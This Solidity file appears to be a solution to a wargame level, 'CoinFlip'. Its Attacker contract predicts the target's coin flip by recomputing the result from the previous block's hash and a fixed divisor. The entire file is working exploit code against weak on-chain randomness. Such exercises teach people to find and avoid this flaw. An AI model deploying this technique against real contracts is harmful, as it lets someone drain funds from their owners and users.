// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "@levels/CoinFlip.sol";

contract Attacker {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public target;

    constructor(address _target) payable {
        target = CoinFlip(_target);
    }

    receive() external payable {}

    function exploit() public payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
